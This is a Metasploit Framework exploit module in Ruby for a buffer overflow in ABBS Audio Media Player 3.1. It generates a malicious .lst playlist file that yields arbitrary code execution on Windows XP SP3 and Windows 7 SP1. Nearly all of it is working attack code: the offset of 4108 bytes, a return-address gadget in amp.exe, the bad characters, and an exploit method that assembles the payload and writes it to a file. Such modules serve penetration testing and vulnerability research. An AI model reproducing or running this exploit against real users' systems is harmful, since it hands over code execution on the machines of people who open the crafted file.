##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ABBS Audio Media Player .LST Buffer Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow in ABBS Audio Media Player. The vulnerability
        occurs when adding an .lst, allowing arbitrary code execution with the privileges
        of the user running the application . This module has been tested successfully on
        ABBS Audio Media Player 3.1 over Windows XP SP3 and Windows 7 SP1.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Julian Ahrens', # Vulnerability discovery and PoC
          'modpr0be <modpr0be[at]spentera.com>' # Metasploit module
        ],
      'References'     =>
        [
          [ 'OSVDB', '75096' ],
          [ 'EDB', '25204' ]
        ],
      'DefaultOptions'  =>
        {
          'EXITFUNC' => 'process',
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars'        => "\x00\x0a\x0d",
          'DisableNops'     => true,
        },
      'Targets'        =>
        [
          [ 'ABBS Audio Media Player 3.1 / Windows XP SP3 / Windows 7 SP1',
            {
              'Ret'     => 0x00412c91, # add esp,14 # pop # pop # pop # ret from amp.exe
              'Offset'  => 4108,
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Jun 30 2013',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ false, 'The file name.', 'msf.lst']),
      ], self.class)

  end

  def exploit
    buffer = payload.encoded
    buffer << rand_text(target['Offset'] - (payload.encoded.length))
    buffer << [target.ret].pack('V')

    file_create(buffer)
  end
end
